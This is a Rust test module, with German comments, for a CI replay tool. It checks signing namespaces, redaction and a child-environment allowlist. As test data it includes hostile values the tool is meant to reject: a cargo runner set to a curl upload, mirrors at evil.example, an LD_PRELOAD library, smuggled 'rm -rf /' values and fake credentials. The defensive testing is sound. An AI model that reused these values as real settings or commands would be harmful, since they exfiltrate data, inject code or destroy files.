    std::fs::write(dir.path().join("ssh-keygen"), "planted").unwrap();
    let elsewhere = tempfile::tempdir().unwrap();
    // Ein relativer Eintrag zählt nie, auch wenn dort eines liegt.
    assert_eq!(find_ssh_keygen("relative/bin", elsewhere.path()), None);
    let found = find_ssh_keygen(dir.path().to_str().unwrap(), elsewhere.path()).unwrap();
    assert!(found.is_absolute());
    // Ein Eintrag im Checkout auch nicht: Der Commit hätte es mitgebracht.
    assert_eq!(
        find_ssh_keygen(dir.path().to_str().unwrap(), dir.path()),
        None
    );
}

#[test]
fn a_timeout_is_not_reproduced() {
    let session = session_with(vec![test_outcome(&["cargo", "test"], 1, Some("."))]);
    let mut fake = Fake::answering(|_| Ran {
        output: String::new(),
        exit_code: None,
        timed_out: true,
        lingering: false,
        truncated: false,
    });
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert_eq!(
        verdicts(&record),
        vec![(ReplayVerdict::NotReproduced, Some("timed out"))]
    );
}

fn golden_record() -> ReplayRecord {
    use minds_core::replay::{ReplayEnvironment, ReplayResult};
    ReplayRecord {
        kind: minds_core::replay::REPLAY_KIND.into(),
        policy: None,
        project: None,
        schema: 1,
        commit: "0123456789abcdef0123456789abcdef01234567".into(),
        session: format!("b3-{}", "ab".repeat(32)),
        interpretation_version: 1,
        results: vec![
            ReplayResult {
                turn: 2,
                call: 0,
                argv: argv(&["cargo", "test", "-p", "sort"]),
                expected: Expected {
                    class: ExecClass::Test,
                    runner: "cargo-test".into(),
                    exit_code: None,
                    tests: Some(TestCounts {
                        passed: 12,
                        failed: 0,
                        ignored: 0,
                    }),
                    benches: Vec::new(),
                },
                observed: Some(Observed {
                    exit_code: Some(0),
                    tests: Some(TestCounts {
                        passed: 11,
                        failed: 0,
                        ignored: 0,
                    }),
                    ..Observed::default()
                }),
                verdict: ReplayVerdict::NotReproduced,
                reason: Some("tests: recorded 12 passed, observed 11 passed".into()),
            },
            ReplayResult {
                turn: 3,
                call: 1,
                argv: argv(&["python", "bench.py"]),
                expected: Expected {
                    class: ExecClass::Bench,
                    runner: "cargo-bench-criterion".into(),
                    exit_code: None,
                    tests: None,
                    benches: vec![BenchValue {
                        name: "sort/10k".into(),
                        value: 1000,
                        unit: "ns".into(),
                    }],
                },
                observed: None,
                verdict: ReplayVerdict::Skipped,
                reason: Some("not allowlisted".into()),
            },
        ],
        environment: ReplayEnvironment {
            ci: Some("gitlab".into()),
            pipeline: Some("4711".into()),
            image: Some("rust:1.90".into()),
        },
    }
}

// Die kanonische Form des Records friert `replay_record_golden` in
// `minds_core::replay` ein — neben dem Typ (die Urteils-Wörter dürfen nur
// dort als Literal stehen, siehe `assurance_is_never_stored`).

#[test]
fn replay_record_signature_namespace() {
    assert!(minds_attest::ssh_keygen_available());
    let dir = tempfile::tempdir().unwrap();
    let key = dir.path().join("ci");
    assert!(
        std::process::Command::new("ssh-keygen")
            .args(["-q", "-t", "ed25519", "-N", "", "-C", "ci", "-f"])
            .arg(&key)
            .status()
            .unwrap()
            .success()
    );
    let public = std::fs::read_to_string(key.with_extension("pub")).unwrap();
    let signers = dir.path().join("allowed_signers");
    std::fs::write(
        &signers,
        format!("ci@pipeline namespaces=\"minds-anchor\" {}", public.trim()),
    )
    .unwrap();
    let text = String::from_utf8(golden_record().canonical_bytes().unwrap()).unwrap();
    let signature = minds_attest::ssh_sign_ns(&text, &key, minds_attest::NS_ANCHOR).unwrap();
    let verify = |payload: &str, namespace| {
        minds_attest::ssh_verify_ns(payload, &signature, &signers, "ci@pipeline", namespace)
            .unwrap()
    };
    assert!(verify(&text, minds_attest::NS_ANCHOR));
    // Derselbe Schlüssel, fremde Namespaces: ungültig.
    assert!(!verify(&text, minds_attest::NS_WITNESS));
    assert!(!verify(&text, minds_attest::NS_DEFAULT));
    // Ein veränderter Record: ungültig.
    assert!(!verify(
        &text.replace("\"passed\":11", "\"passed\":12"),
        minds_attest::NS_ANCHOR
    ));
}

#[test]
fn the_summary_matches_the_golden_lines() {
    let mut record = golden_record();
    // Drei reproduzierte Testläufe, ein übersprungener.
    let mut passing = record.results[0].clone();
    passing.verdict = ReplayVerdict::Reproduced;
    passing.reason = None;
    let skipped = record.results[1].clone();
    record.results = vec![
        passing.clone(),
        ReplayResult {
            argv: argv(&["cargo", "test", "-p", "search"]),
            ..passing.clone()
        },
        ReplayResult {
            argv: argv(&["cargo", "test"]),
            ..passing
        },
        skipped,
    ];
    assert_eq!(
        summary_lines(&[record]).join("\n"),
        "replay   3/3 decisive test runs reproduced (cargo test -p sort …)\n\
         replay   1 skipped (not allowlisted): python bench.py"
    );
    assert_eq!(
        summary_lines(&[]),
        vec!["replay   no decisive test or bench runs"]
    );
}

#[test]
fn the_child_environment_is_cleared_to_the_allowlist() {
    let mut policy = policy();
    policy.env = vec!["RUST_LOG".into()];
    // Eine Policy könnte (an der Validierung vorbei, etwa aus einem
    // älteren Binary) sensible Namen tragen — sie gehen trotzdem nicht durch.
    policy.env.push("CI_JOB_TOKEN".into());
    policy.env.push("MINDS_ANCHOR_KEY_FILE".into());
    let checkout = tempfile::tempdir().unwrap();
    let bin = checkout.path().join("bin");
    // Ein Toolchain-Verzeichnis im Checkout (CI-Cache) bringt
    // ungereviewte Programme mit.
    let checkout_rustup = checkout.path().join(".rustup").display().to_string();
    let path = format!("/usr/bin:.:relative/bin::{}:/opt/cargo/bin", bin.display());
    let vars = [
        ("PATH", path.as_str()),
        ("HOME", "/home/ci"),
        ("home", "lowercase-is-ignored"),
        ("CARGO_HOME", "/opt/cargo"),
        ("CARGO_REGISTRY_TOKEN", "cio_secret"),
        ("CARGO_REGISTRIES_X_TOKEN", "cio_secret"),
        ("CARGO_HTTP_PROXY", "http://user:hunter2@proxy:3128"),
        ("CARGO_HTTPS_PROXY", "alice:S3cr3t@proxy:3128"),
        (
            "CARGO_TARGET_DIR",
            "/tmp/ghp_0123456789abcdefghijklmnopqrstuvwxyzAB",
        ),
        ("RUSTUP_HOME", checkout_rustup.as_str()),
        (
            "CARGO_REGISTRIES_X_INDEX",
            "sparse+https://ci:pw@index.example/",
        ),
        ("CARGO_NET_GIT_FETCH_WITH_CLI", "true"),
        ("CARGO_HTTP_AUTH", "x"),
        ("RUSTUP_TOOLCHAIN", "stable"),
        ("RUST_LOG", "info"),
        (
            "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER",
            "/usr/bin/curl -T /tmp/k https://x",
        ),
        ("CARGO_BUILD_RUSTC_WRAPPER", "/usr/bin/env"),
        ("CARGO_ENCODED_RUSTFLAGS", "-Cpanic=abort"),
        ("CARGO_REGISTRIES_X_INDEX", "sparse+https://evil.example/"),
        ("RUSTUP_DIST_SERVER", "https://evil.example"),
        ("RUSTUP_DIST_ROOT", "https://evil.example/dist"),
        ("CI_JOB_TOKEN", "glcbt-secret"),
        ("MINDS_ANCHOR_KEY_FILE", "/secrets/key"),
        ("SSH_AUTH_SOCK", "/tmp/agent"),
        ("AWS_SECRET_ACCESS_KEY", "x"),
        ("LD_PRELOAD", "/tmp/evil.so"),
        ("RUSTC_WRAPPER", "/tmp/evil"),
    ]
    .map(|(k, v)| (k.into(), v.into()));
    let redaction = minds_redact::RedactionConfig::default().pipeline().unwrap();
    let env = child_env(&policy, vars, checkout.path(), &|value: &str| {
        clean(&redaction, value)
    });
    let names: Vec<&str> = env.iter().map(|(k, _)| k.as_str()).collect();
    assert_eq!(
        names,
        vec![
            "CARGO_HOME",
            "CARGO_NET_GIT_FETCH_WITH_CLI",
            "HOME",
            "PATH",
            "RUSTUP_TOOLCHAIN",
            "RUST_LOG"
        ]
    );
    let path = &env.iter().find(|(k, _)| k == "PATH").unwrap().1;
    // Eine Toolchain als Pfad — auch absolut — brächte fremde `rustc`/`cargo`.
    let toolchain = child_env(
        &policy,
        [("RUSTUP_TOOLCHAIN".into(), "/opt/evil-toolchain".into())],
        checkout.path(),
        &|_: &str| true,
    );
    assert!(toolchain.is_empty(), "{toolchain:?}");
    // Relative, leere und Einträge im Checkout fallen weg.
    #[cfg(unix)]
    assert_eq!(path, "/usr/bin:/opt/cargo/bin");
    let _ = path;
}

#[test]
fn the_ci_environment_carries_only_checked_values() {
    let redaction = minds_redact::RedactionConfig::default().pipeline().unwrap();
    let vars = |pairs: &'static [(&'static str, &'static str)]| {
        move |name: &str| {
            pairs
                .iter()
                .find(|(k, _)| *k == name)
                .map(|(_, v)| (*v).to_owned())
        }
    };
    assert_eq!(
        ci_environment(
            &redaction,
            vars(&[
                ("GITLAB_CI", "true"),
                ("CI_PIPELINE_ID", "4711"),
                ("CI_JOB_IMAGE", "registry.example.com/rust:1.90"),
            ])
        ),
        ReplayEnvironment {
            ci: Some("gitlab".into()),
            pipeline: Some("4711".into()),
            image: Some("registry.example.com/rust:1.90".into()),
        }
    );
    // Was nicht passt, fehlt — statt ungeprüft im Record zu stehen.
    assert_eq!(
        ci_environment(
            &redaction,
            vars(&[
                ("GITLAB_CI", "true"),
                ("CI_PIPELINE_ID", "47 11; rm"),
                (
                    "CI_JOB_IMAGE",
                    "user:glpat-abcdefghij1234567890@registry/rust"
                ),
            ])
        ),
        ReplayEnvironment {
            ci: Some("gitlab".into()),
            pipeline: None,
            image: None,
        }
    );
    // Ein Image mit Zugangsdaten vor dem Pfad fehlt, auch wenn kein
    // Detektor das Passwort erkennt; ein Digest hinter dem Pfad bleibt.
    assert_eq!(
        ci_environment(
            &redaction,
            vars(&[
                ("GITLAB_CI", "true"),
                (
                    "CI_JOB_IMAGE",
                    "user:Pa55w0rd-x9@registry.example.com/rust:1.90"
                ),
            ])
        )
        .image,
        None
    );
    let digest = "registry.gitlab.com/group/img:1.2@sha256:\
                  0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c4b5a69788796a5b4c3d2e1f0";
    let pairs: &'static [(&'static str, &'static str)] =
        Box::leak(Box::new([("GITLAB_CI", "true"), ("CI_JOB_IMAGE", digest)]));
    assert_eq!(
        ci_environment(&redaction, vars(pairs)).image.as_deref(),
        Some(digest)
    );
    assert_eq!(
        ci_environment(&redaction, vars(&[])),
        ReplayEnvironment::default()
    );
}

#[test]
fn a_record_with_redactable_text_is_refused() {
    let redaction = minds_redact::RedactionConfig::default().pipeline().unwrap();
    assert!(redaction.scan_replay(golden_record().clone()).is_ok());
    let mut record = golden_record();
    record.results[0].argv = argv(&["cargo", "test", "--password", "hunter2"]);
    assert!(redaction.scan_replay(record.clone()).is_err());
    // Auch der Runner-Name stammt aus dem (womöglich untergeschobenen)
    // Envelope.
    let mut record = golden_record();
    record.results[0].expected.runner = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB".into();
    assert!(redaction.scan_replay(record.clone()).is_err());
    // Ids werden ihrer Form nach geprüft.
    let mut record = golden_record();
    record.commit = "HEAD; rm -rf /".into();
    assert!(redaction.scan_replay(record.clone()).is_err());
}

/// Außerhalb von Unix lehnt `minds replay` ab, bevor es irgendetwas liest
/// oder startet: Die Ausgabe käme nicht in Reihenfolge an, und das
/// Programm würde auch im ungefilterten PATH gesucht.
#[cfg(not(unix))]
#[test]
fn replay_is_refused_outside_unix() {
    let err = replay(None, true).err().unwrap().to_string();
    assert_eq!(err, NOT_SUPPORTED);
}

#[cfg(unix)]
mod system {
    use super::*;

    fn invoke(argv_items: &[&str], cwd: &Path, env: &[(String, String)], timeout: Duration) -> Ran {
        let argv = argv(argv_items);
        System
            .spawn(&Invocation {
                argv: &argv,
                cwd,
                env,
                timeout,
            })
            .unwrap()
    }

    fn path_env() -> Vec<(String, String)> {
        vec![("PATH".into(), "/usr/bin:/bin".into())]
    }

    #[test]
    fn the_real_spawner_clears_the_environment_and_uses_the_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let ran = invoke(&["env"], dir.path(), &path_env(), Duration::from_secs(30));
        assert_eq!(ran.exit_code, Some(0));
        let names: Vec<&str> = ran
            .output
            .lines()
            .filter_map(|line| line.split_once('=').map(|(k, _)| k))
            .collect();
        assert_eq!(names, vec!["PATH"], "{}", ran.output);

        let ran = invoke(&["pwd"], dir.path(), &path_env(), Duration::from_secs(30));
        let real = std::fs::canonicalize(dir.path()).unwrap();
        assert_eq!(Path::new(ran.output.trim()), real);
    }

    #[test]
    fn the_real_spawner_reports_exit_codes_and_merges_stderr() {
        let dir = tempfile::tempdir().unwrap();
        let ran = invoke(&["false"], dir.path(), &path_env(), Duration::from_secs(30));
        assert_eq!(ran.exit_code, Some(1));
        assert!(!ran.timed_out);
        let ran = invoke(
            &["ls", "/definitely-not-here"],
            dir.path(),
            &path_env(),
            Duration::from_secs(30),
        );
        assert_ne!(ran.exit_code, Some(0));
        assert!(!ran.output.is_empty(), "stderr is part of the output");
    }

    #[test]
    fn the_real_spawner_keeps_stdout_and_stderr_in_order() {
        // cargo schreibt Kopfzeilen nach stderr, libtest Ergebnisse nach
        // stdout — der Parser braucht die Reihenfolge (`2>&1`). Die Shell
        // ist hier nur das Testprogramm des Spawners, kein Replay-Pfad.
        let dir = tempfile::tempdir().unwrap();
        let ran = invoke(
            &["sh", "-c", "echo one; echo two >&2; echo three"],
            dir.path(),
            &path_env(),
            Duration::from_secs(30),
        );
        assert_eq!(ran.output, "one\ntwo\nthree\n");
    }

    #[test]
    fn a_detached_grandchild_cannot_hold_the_run() {
        // Ein Test, der einen Daemon in eine eigene Session löst (`setsid`)
        // und ihm stdout vererbt: Die Gruppe erreicht ihn nicht, die Pipe
        // bleibt offen — der Lauf darf trotzdem nicht hängen.
        if std::process::Command::new("perl")
            .arg("-v")
            .output()
            .is_err()
        {
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        let started = std::time::Instant::now();
        let ran = invoke(
            &[
                "perl",
                "-MPOSIX",
                "-e",
                "if (fork() == 0) { POSIX::setsid(); sleep 60; exit 0 } print qq(x\\n); exit 0",
            ],
            dir.path(),
            &path_env(),
            Duration::from_secs(30),
        );
        assert!(started.elapsed() < Duration::from_secs(15), "the run hung");
        assert!(ran.lingering, "{}", ran.output);
        assert_eq!(ran.output, "x\n");
        assert_eq!(ran.exit_code, Some(0));
    }

    #[test]
    fn the_real_spawner_kills_on_timeout() {
        let dir = tempfile::tempdir().unwrap();
        let started = std::time::Instant::now();
        let ran = invoke(
            &["sleep", "30"],
            dir.path(),
            &path_env(),
            Duration::from_millis(300),
        );
        assert!(ran.timed_out);
        assert_eq!(ran.exit_code, None);
        assert!(started.elapsed() < Duration::from_secs(20));
    }
}
